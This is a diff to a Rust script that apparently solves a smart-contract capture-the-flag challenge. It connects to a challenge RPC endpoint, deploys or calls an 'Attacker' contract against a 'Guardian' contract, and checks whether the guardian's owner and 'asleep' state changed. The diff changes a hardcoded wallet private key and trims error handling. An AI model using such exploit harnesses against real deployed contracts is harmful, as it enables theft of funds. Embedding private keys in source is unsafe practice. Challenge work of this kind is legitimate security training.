@@ -15,10 +15,10 @@ pub struct Contracts {
     attacker: Attacker<SignerMiddleware<Provider<Http>, Wallet<SigningKey>>>,
 }
 
-const RPC_URL: &str = "http://34.159.107.195:18546/914e3e68-a154-461d-97d4-36a93854f33e";
+const RPC_URL: &str = "http://34.159.107.195:18546/c782ba1b-c7c8-4eb7-91a5-f4915e91fb59";
 pub static WALLET_PRIVATE_KEY: &str =
-    "0x5addb90ff56cf8d17f627d30e2afdb5db28810ce8dd77add8c9d8b8e4e54f73d";
-pub static SETUP_CONTRACT_ADDRESS: &str = "0xB28070edaBFc944c2f4C081E9384bfC3f5886b71";
+    "0xbd2cba44438f8f15bb1d449e90f90b73e20f5eae58a0a263efc0e44a60e5c28f";
+pub static SETUP_CONTRACT_ADDRESS: &str = "0xF8cB34F9D6F5160e250bD3266cb6EA9A7677Cf2B";
 
 pub static PROVIDER: Lazy<Provider<Http>> = Lazy::new(|| {
     Provider::<Http>::try_from(RPC_URL)
@@ -68,36 +68,11 @@ pub async fn contracts() -> Contracts {
 #[tokio::main]
 async fn main() {
     let contracts = contracts().await;
-
     dbg!(contracts.guardian.asleep().call().await.unwrap());
     dbg!(contracts.guardian.owner().call().await.unwrap());
 
     let tx = contracts.attacker.attack().value(1337);
     match tx.clone().send().await {
-        Ok(pending_tx) => {
-            pending_tx.await.unwrap();
-            dbg!(contracts.guardian.asleep().call().await.unwrap());
-            dbg!(contracts.guardian.owner().call().await.unwrap());
-        }
-        Err(e) => {
-            if let Some(decoded_error) = e.decode_revert::<String>() {
-                dbg!(contracts.guardian.asleep().call().await.unwrap());
-                dbg!(contracts.guardian.owner().call().await.unwrap());
-                panic!("{}", decoded_error);
-            } else {
-                match e.as_revert() {
-                    Some(revert) => {
-                        panic!("{}", revert);
-                    }
-                    None => {
-                        panic!("{}", e);
-                    }
-                }
-            }
-        }
-    }
-    let tx2 = contracts.guardian.put_to_sleep();
-    match tx2.clone().send().await {
         Ok(pending_tx) => {
             pending_tx.await.unwrap();
             dbg!(contracts.guardian.asleep().call().await.unwrap());
